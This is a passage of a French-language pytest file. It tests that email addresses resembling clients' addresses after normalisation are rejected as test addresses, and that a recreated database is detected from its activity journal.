        "D": Dossier("D", "Delta", "contact@société.fr", "M", circuit="C-DIRECT"),
    }


@pytest.mark.parametrize("adresse", [
    "autre@ALPHA-SARL.FR.", "autre@mail.alpha-sarl.fr", "autre@xn--socit-esab.fr", "autre@deep.sous.gamma.fr",
    "autre@société.fr", "gerant+test@gmail.com", "ge.rant@gmail.com", "gerant@googlemail.com",
    "G.E.R.A.N.T+x@GoogleMail.com", "gerant@gmail.com.",
])
def test_adresse_test_formes_normalisees_refusees(adresse):
    with pytest.raises(cycle.ConfigInvalide):
        cycle.verifier_adresse_test(adresse, _dossiers_variantes())


@pytest.mark.parametrize("adresse", ["test@gmail.com", "gerant2@gmail.com", "autre@alpha-sarl.fr.evil.invalid",
                                     "autre@sarl.fr", "autre@notalpha-sarl.fr", "moi@exemple.invalid"])
def test_adresse_test_formes_voisines_non_clientes_acceptees(adresse):
    cycle.verifier_adresse_test(adresse, _dossiers_variantes())


def test_base_recreee_une_validation_seule_au_journal_suffit_a_refuser(entree, tmp_path):
    inst = nouvelle_instance(tmp_path / "i")
    _valider_premier(inst, entree)
    _base_supprimee(inst)
    with pytest.raises(cycle.BaseRecreee):
        lancer(entree, inst, jour(1))


def test_base_recreee_un_envoi_seul_au_journal_suffit_a_refuser(entree, tmp_path):
    inst, _ = _instance_avec_envoi(tmp_path, entree)
    _reecrire_journal(inst, lambda e: None if e.action == "valide" else (e.acteur, e.details))
    _base_supprimee(inst)
    with pytest.raises(cycle.BaseRecreee):
        lancer(entree, inst, jour(1))
